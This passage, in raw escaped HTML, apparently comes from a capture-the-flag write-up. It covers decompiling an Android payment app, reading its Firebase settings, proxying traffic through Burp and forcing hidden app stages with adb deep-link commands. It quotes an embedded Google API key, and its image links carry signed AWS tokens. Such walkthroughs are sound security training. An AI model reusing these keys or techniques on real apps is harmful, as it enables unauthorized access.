noreferrer\"\u003e\u003cspan\u003eIntelliJ IDEA\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e.\u003c/p\u003e\n\n\u003cp\u003eI then read all relevant parts of the source code (there isn\u0026#39;t much, if you ignore all the standard android stuff) and it was fairly clear that the app interacts with a Firebase database and attempts to get your through 3 stages, at the end of which you should have some values for Header, Token and Host from that database.\u003c/p\u003e\n\n\u003cp\u003eCredentials to access Firebase could be found in \u003ccode\u003eres/values/strings.xml\u003c/code\u003e:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight xml\"\u003e\u003ccode\u003e\u003cspan class=\"nt\"\u003e\u0026lt;string\u003c/span\u003e \u003cspan class=\"na\"\u003ename=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;firebase_database_url\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003ehttps://bountypay-90f64.firebaseio.com\u003cspan class=\"nt\"\u003e\u0026lt;/string\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;string\u003c/span\u003e \u003cspan class=\"na\"\u003ename=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;gcm_defaultSenderId\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e467982724703\u003cspan class=\"nt\"\u003e\u0026lt;/string\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;string\u003c/span\u003e \u003cspan class=\"na\"\u003ename=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;google_api_key\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003eAIzaSyAyr601_-ElsasDnhGORBykg0ZTDaOxFeo\u003cspan class=\"nt\"\u003e\u0026lt;/string\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;string\u003c/span\u003e \u003cspan class=\"na\"\u003ename=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;google_app_id\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e1:467982724703:android:4428e053082d32ce84b5ea\u003cspan class=\"nt\"\u003e\u0026lt;/string\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;string\u003c/span\u003e \u003cspan class=\"na\"\u003ename=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;google_crash_reporting_api_key\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003eAIzaSyAyr601_-ElsasDnhGORBykg0ZTDaOxFeo\u003cspan class=\"nt\"\u003e\u0026lt;/string\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;string\u003c/span\u003e \u003cspan class=\"na\"\u003ename=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;google_storage_bucket\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003ebountypay-90f64.appspot.com\u003cspan class=\"nt\"\u003e\u0026lt;/string\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eI quickly checked for some common misconfigurations, such as whether Firebase was publicly readable by accessing \u003ca title=\"https://bountypay-90f64.firebaseio.com/.json\" href=\"/redirect?url=https%3A%2F%2Fbountypay-90f64.firebaseio.com%2F.json\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://bountypay-90f64.firebaseio.com/.json\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e, but it seemed that access controls were properly configured.\u003c/p\u003e\n\n\u003cp\u003eI knew I then had two routes - either to understand the code well enough to talk to a database directly and extract the needed data (and maybe write a small script for it) or to try and follow through the app exactly as it was designed. Former would have probably been quicker, but the latter seemed more interesting - so I went ahead and installed APK on an emulator.\u003c/p\u003e\n\n\u003cp\u003eThere are different technologies you could use here. I\u0026#39;m not an expert in Android, but given how generally awesome IntelliJ platform is, the obvious choice for me was to use \u003ca href=\"/redirect?url=https%3A%2F%2Fdeveloper.android.com%2Fstudio%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eAndroid Studio\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e.\u003c/p\u003e\n\n\u003cp\u003eRunning emulator is fairly straight-forward, and is described in these guides:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003e\u003ca title=\"https://developer.android.com/studio/run/emulator\" href=\"/redirect?url=https%3A%2F%2Fdeveloper.android.com%2Fstudio%2Frun%2Femulator\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://developer.android.com/studio/run/emulator\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca title=\"https://developer.android.com/studio/run/managing-avds\" href=\"/redirect?url=https%3A%2F%2Fdeveloper.android.com%2Fstudio%2Frun%2Fmanaging-avds\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://developer.android.com/studio/run/managing-avds\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eThe steps I\u0026#39;ve taken to set up my environment were as follows:\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003eOpen Android Studio, select \u0026quot;debug APK\u0026quot; and point to APK file.\u003c/li\u003e\n\u003cli\u003eInstall Android SDK, if not already\u003c/li\u003e\n\u003cli\u003eCreate new device within AVD and start it\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003cp\u003eI\u0026#39;ve also set up traffic proxying through Burp:\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003eConfigure proxy in the Emulator\u0026#39;s settings as described \u003ca href=\"/redirect?url=https%3A%2F%2Fdeveloper.android.com%2Fstudio%2Frun%2Femulator-networking\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehere\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e.\u003c/li\u003e\n\u003cli\u003eInstall Burp\u0026#39;s CA certificate on the device. You can follow Burp guide \u003ca href=\"/redirect?url=https%3A%2F%2Fportswigger.net%2Fsupport%2Finstalling-burp-suites-ca-certificate-in-an-android-device\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehere\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e but I find it easier to push the certificate to device\u0026#39;s SD card using \u003ccode\u003eadb\u003c/code\u003e (as opposed to sending it via email):\u003c/li\u003e\n\u003c/ol\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight shell\"\u003e\u003ccode\u003e\u003cspan class=\"nv\"\u003e$ \u003c/span\u003eadb push cacert.cer /mnt/sdcard\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch3 id=\"android-partoneactivity\"\u003eAndroid | PartOneActivity\u003c/h3\u003e\n\n\u003cp\u003eNow that everything is set up we can launch the app. First it just asks us for our username and (optional) twitter handle. On the next screen, nothing seems to happen, and the clues at the bottom say \u0026quot;deep links\u0026quot; and \u0026quot;params\u0026quot;:\u003cbr\u003e\n\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"android-part-one-activity.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/fnyuUtasRm6P3QtR6W34uEDW?response-content-disposition=attachment%3B%20filename%3D%22android-part-one-activity.png%22%3B%20filename%2A%3DUTF-8%27%27android-part-one-activity.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQSUJSTWNA%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T070811Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDC4LZo82wc2eCvBFlhjwE027CwJoHB88%2BMK2v03JEf7AIgTsNTuR7XI5zLkpcU%2F192zliPMALv25wXWHyoW56mHW0qtAMIVRABGgwwMTM2MTkyNzQ4NDkiDDQxd6Ep%2FudaJolhjiqRA%2FV9m3Q5qTHiEf%2B0F56QxIa0FX4xcw3kyVQ754zuEWG6%2FFHm5u50c%2FkjIZTK4iokf%2F5bg8%2F9lzPcfaf%2FlyMeeuZQiIR66c8Q0ZynlQYFFg39COCCRcmQH0rk4Py7SioeZK1WX50szdnMCAEBM0%2FYGIJRFlpJYz5%2BF7cuCEDZDVFz70QPaeLM9Aq2Hp0OWlaD%2BlKU2Ya8oXmKGTVLeV6xTf66mRdzvW8I4qKgZpByKnAcip5WWnkttPjUxPiLaEeZ%2BClnUyHZas2bB1iPmPH0rQXcKWbTOq%2BJJm8xX%2FgqtqSgjGTmncJVZJxe0UaRUPXS%2BxPh0KYERT9Te4D5sREOcmaPJ0lojWm5AuNIxK3S30FeTamdldG5jOgcjm7r6e2HjWcB7yfe4%2BCsYd2eVLbbXk95jZRHQohr%2B7Z9YEqq00TUANe07BXm%2FKoAPBMy0bYQHYmVJaGS31XhmN6DRKUn5mwwU6NQ87eIymigu48swQSaSOa0S3Ve15n99tYKCLxw%2FqcLrXK9DmAPRXyB2cTH85tpMJ7Qqv8FOusB0TY7T%2F8PPlS9Pw17cj5sLPnZSdHFb4OJ7xNuArhvZUxC%2FDdQIpfgbN40hDHy3r94ejzq63ULcWroBoxExSJ8F%2BIqLrT2jEE%2BHYV9rJ3uN20mlrWN07M1wfpVQeu7mZyiWu%2BTKEOjyLznji7d3Efn7A1SwzF%2FWi11RcA9%2BGeNTFCiOeyJRV4JWopx6NNi8TVr6hBraJmZeqXIUCIj4yW%2BvdbZ%2F7b%2BDWNq1S8BMna3Htt9r6lmeANRYdDH%2BkiA2F6n7nJrrrNm3hF7NHjHy1GdUin3XffXKseDfHdRNqxNelH1SrChi2zziLtHrQ%3D%3D\u0026amp;X-Amz-Signature=20528f423fbe75d8f4c7d74bf188ac58b2d7dbc3586e7984b6e1803eea06db1a\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/fnyuUtasRm6P3QtR6W34uEDW?response-content-disposition=attachment%3B%20filename%3D%22android-part-one-activity.png%22%3B%20filename%2A%3DUTF-8%27%27android-part-one-activity.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQSUJSTWNA%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T070811Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDC4LZo82wc2eCvBFlhjwE027CwJoHB88%2BMK2v03JEf7AIgTsNTuR7XI5zLkpcU%2F192zliPMALv25wXWHyoW56mHW0qtAMIVRABGgwwMTM2MTkyNzQ4NDkiDDQxd6Ep%2FudaJolhjiqRA%2FV9m3Q5qTHiEf%2B0F56QxIa0FX4xcw3kyVQ754zuEWG6%2FFHm5u50c%2FkjIZTK4iokf%2F5bg8%2F9lzPcfaf%2FlyMeeuZQiIR66c8Q0ZynlQYFFg39COCCRcmQH0rk4Py7SioeZK1WX50szdnMCAEBM0%2FYGIJRFlpJYz5%2BF7cuCEDZDVFz70QPaeLM9Aq2Hp0OWlaD%2BlKU2Ya8oXmKGTVLeV6xTf66mRdzvW8I4qKgZpByKnAcip5WWnkttPjUxPiLaEeZ%2BClnUyHZas2bB1iPmPH0rQXcKWbTOq%2BJJm8xX%2FgqtqSgjGTmncJVZJxe0UaRUPXS%2BxPh0KYERT9Te4D5sREOcmaPJ0lojWm5AuNIxK3S30FeTamdldG5jOgcjm7r6e2HjWcB7yfe4%2BCsYd2eVLbbXk95jZRHQohr%2B7Z9YEqq00TUANe07BXm%2FKoAPBMy0bYQHYmVJaGS31XhmN6DRKUn5mwwU6NQ87eIymigu48swQSaSOa0S3Ve15n99tYKCLxw%2FqcLrXK9DmAPRXyB2cTH85tpMJ7Qqv8FOusB0TY7T%2F8PPlS9Pw17cj5sLPnZSdHFb4OJ7xNuArhvZUxC%2FDdQIpfgbN40hDHy3r94ejzq63ULcWroBoxExSJ8F%2BIqLrT2jEE%2BHYV9rJ3uN20mlrWN07M1wfpVQeu7mZyiWu%2BTKEOjyLznji7d3Efn7A1SwzF%2FWi11RcA9%2BGeNTFCiOeyJRV4JWopx6NNi8TVr6hBraJmZeqXIUCIj4yW%2BvdbZ%2F7b%2BDWNq1S8BMna3Htt9r6lmeANRYdDH%2BkiA2F6n7nJrrrNm3hF7NHjHy1GdUin3XffXKseDfHdRNqxNelH1SrChi2zziLtHrQ%3D%3D\u0026amp;X-Amz-Signature=20528f423fbe75d8f4c7d74bf188ac58b2d7dbc3586e7984b6e1803eea06db1a\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eGoing back to our Java source code, within \u003ccode\u003ePartOneActivity.java\u003c/code\u003e, we see:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight java\"\u003e\u003ccode\u003e\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003egetIntent\u003c/span\u003e\u003cspan class=\"o\"\u003e()\u003c/span\u003e \u003cspan class=\"o\"\u003e!=\u003c/span\u003e \u003cspan class=\"kc\"\u003enull\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan class=\"n\"\u003egetIntent\u003c/span\u003e\u003cspan class=\"o\"\u003e().\u003c/span\u003e\u003cspan class=\"na\"\u003egetData\u003c/span\u003e\u003cspan class=\"o\"\u003e()\u003c/span\u003e \u003cspan class=\"o\"\u003e!=\u003c/span\u003e \u003cspan class=\"kc\"\u003enull\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n  \u003cspan class=\"nc\"\u003eString\u003c/span\u003e \u003cspan class=\"n\"\u003estr\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003egetIntent\u003c/span\u003e\u003cspan class=\"o\"\u003e().\u003c/span\u003e\u003cspan class=\"na\"\u003egetData\u003c/span\u003e\u003cspan class=\"o\"\u003e().\u003c/span\u003e\u003cspan class=\"na\"\u003egetQueryParameter\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;start\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n  \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003estr\u003c/span\u003e \u003cspan class=\"o\"\u003e!=\u003c/span\u003e \u003cspan class=\"kc\"\u003enull\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan class=\"n\"\u003estr\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eequals\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;PartTwoActivity\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan class=\"n\"\u003esharedPreferences\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003econtains\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;USERNAME\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e))\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"n\"\u003estr\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003esharedPreferences\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003egetString\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;USERNAME\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"nc\"\u003eSharedPreferences\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eEditor\u003c/span\u003e \u003cspan class=\"n\"\u003eeditor\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003esharedPreferences\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eedit\u003c/span\u003e\u003cspan class=\"o\"\u003e();\u003c/span\u003e\n    \u003cspan class=\"nc\"\u003eString\u003c/span\u003e \u003cspan class=\"n\"\u003estr1\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003esharedPreferences\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003egetString\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;TWITTERHANDLE\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"n\"\u003eeditor\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eputString\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;PARTONE\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;COMPLETE\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e).\u003c/span\u003e\u003cspan class=\"na\"\u003eapply\u003c/span\u003e\u003cspan class=\"o\"\u003e();\u003c/span\u003e\n    \u003cspan class=\"n\"\u003elogFlagFound\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003estr\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003estr1\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"n\"\u003estartActivity\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"nc\"\u003eIntent\u003c/span\u003e\u003cspan class=\"o\"\u003e((\u003c/span\u003e\u003cspan class=\"nc\"\u003eContext\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"k\"\u003ethis\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"nc\"\u003ePartTwoActivity\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eclass\u003c/span\u003e\u003cspan class=\"o\"\u003e));\u003c/span\u003e\n  \u003cspan class=\"o\"\u003e}\u003c/span\u003e \n\u003cspan class=\"o\"\u003e}\u003c/span\u003e \n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eNot having developed for Android ever before, it wasn\u0026#39;t completely obvious what this is doing until I googled for \u003ccode\u003egetIntent()\u003c/code\u003e and deep links. The official guide on \u003ca href=\"/redirect?url=https%3A%2F%2Fdeveloper.android.com%2Ftraining%2Fapp-links%2Fdeep-linking\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eDeep Links\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e explains it all very well. In particular, \u003ca href=\"/redirect?url=https%3A%2F%2Fdeveloper.android.com%2Ftraining%2Fapp-links%2Fdeep-linking%23testing-filters\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eTest your deep links\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e section is exactly what we\u0026#39;re after since it allows us to send a deep link to the app via \u003ccode\u003eadb\u003c/code\u003e.\u003c/p\u003e\n\n\u003cp\u003eWe can see the intents that the app has defined within \u003ccode\u003eAndroidManifest.xml\u003c/code\u003e:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight xml\"\u003e\u003ccode\u003e\u003cspan class=\"nt\"\u003e\u0026lt;activity\u003c/span\u003e \u003cspan class=\"na\"\u003eandroid:label=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;@string/title_activity_part_one\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003eandroid:name=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;bounty.pay.PartOneActivity\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003eandroid:theme=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;@style/AppTheme.NoActionBar\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;intent-filter\u003c/span\u003e \u003cspan class=\"na\"\u003eandroid:label=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n        \u003cspan class=\"nt\"\u003e\u0026lt;action\u003c/span\u003e \u003cspan class=\"na\"\u003eandroid:name=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;android.intent.action.VIEW\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n        \u003cspan class=\"nt\"\u003e\u0026lt;category\u003c/span\u003e \u003cspan class=\"na\"\u003eandroid:name=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;android.intent.category.DEFAULT\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n        \u003cspan class=\"nt\"\u003e\u0026lt;category\u003c/span\u003e \u003cspan class=\"na\"\u003eandroid:name=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;android.intent.category.BROWSABLE\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n        \u003cspan class=\"nt\"\u003e\u0026lt;data\u003c/span\u003e \u003cspan class=\"na\"\u003eandroid:host=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;part\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003eandroid:scheme=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;one\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;/intent-filter\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/activity\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThe key part here is \u003ccode\u003e\u0026lt;data android:host=\u0026quot;part\u0026quot; android:scheme=\u0026quot;one\u0026quot;/\u0026gt;\u003c/code\u003e which gives us the scheme and host to use in the URL, as well as \u003ccode\u003e\u0026lt;action android:name=\u0026quot;android.intent.action.VIEW\u0026quot;/\u0026gt;\u003c/code\u003e which is the intent name. From Java source code we see that it wants URl to have a \u003ccode\u003estart\u003c/code\u003e query string parameter, equal to \u003ccode\u003ePartTwoActivity\u003c/code\u003e, so the command we run in \u003ccode\u003eadb\u003c/code\u003e is:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight shell\"\u003e\u003ccode\u003e\u003cspan class=\"nv\"\u003e$ \u003c/span\u003eadb shell am start \u003cspan class=\"nt\"\u003e-W\u003c/span\u003e \u003cspan class=\"nt\"\u003e-a\u003c/span\u003e android.intent.action.VIEW \u003cspan class=\"nt\"\u003e-d\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;one://part/?start=PartTwoActivity\u0026quot;\u003c/span\u003e bounty.pay\nStarting: Intent \u003cspan class=\"o\"\u003e{\u003c/span\u003e \u003cspan class=\"nv\"\u003eact\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eandroid.intent.action.VIEW \u003cspan class=\"nv\"\u003edat\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eone://part/?start\u003cspan class=\"o\"\u003e=\u003c/span\u003ePartTwoActivity \u003cspan class=\"nv\"\u003epkg\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003ebounty.pay \u003cspan class=\"o\"\u003e}\u003c/span\u003e\nStatus: ok\nActivity: bounty.pay/.PartOneActivity\nThisTime: 883\nTotalTime: 883\nWaitTime: 893\nComplete\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch3 id=\"android-parttwoactivity\"\u003eAndroid | PartTwoActivity\u003c/h3\u003e\n\n\u003cp\u003eThis moves us to the next screen, where the hints are \u003ccode\u003ecurrently invisible\u003c/code\u003e and \u003ccode\u003evisible with the right params\u003c/code\u003e, and nothing further visible on screen.\u003c/p\u003e\n\n\u003cp\u003eLooking at the java source code for \u003ccode\u003ePartTwoActivity.java\u003c/code\u003e we see:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight java\"\u003e\u003ccode\u003e\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003egetIntent\u003c/span\u003e\u003cspan class=\"o\"\u003e()\u003c/span\u003e \u003cspan class=\"o\"\u003e!=\u003c/span\u003e \u003cspan class=\"kc\"\u003enull\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan class=\"n\"\u003egetIntent\u003c/span\u003e\u003cspan class=\"o\"\u003e().\u003c/span\u003e\u003cspan class=\"na\"\u003egetData\u003c/span\u003e\u003cspan class=\"o\"\u003e()\u003c/span\u003e \u003cspan class=\"o\"\u003e!=\u003c/span\u003e \u003cspan class=\"kc\"\u003enull\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n  \u003cspan class=\"nc\"\u003eUri\u003c/span\u003e \u003cspan class=\"n\"\u003euri\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003egetIntent\u003c/span\u003e\u003cspan class=\"o\"\u003e().\u003c/span\u003e\u003cspan class=\"na\"\u003egetData\u003c/span\u003e\u003cspan class=\"o\"\u003e();\u003c/span\u003e\n  \u003cspan class=\"nc\"\u003eString\u003c/span\u003e \u003cspan class=\"n\"\u003estr1\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003euri\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003egetQueryParameter\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;two\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n  \u003cspan class=\"nc\"\u003eString\u003c/span\u003e \u003cspan class=\"n\"\u003estr2\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003euri\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003egetQueryParameter\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;switch\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n  \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003estr1\u003c/span\u003e \u003cspan class=\"o\"\u003e!=\u003c/span\u003e \u003cspan class=\"kc\"\u003enull\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan 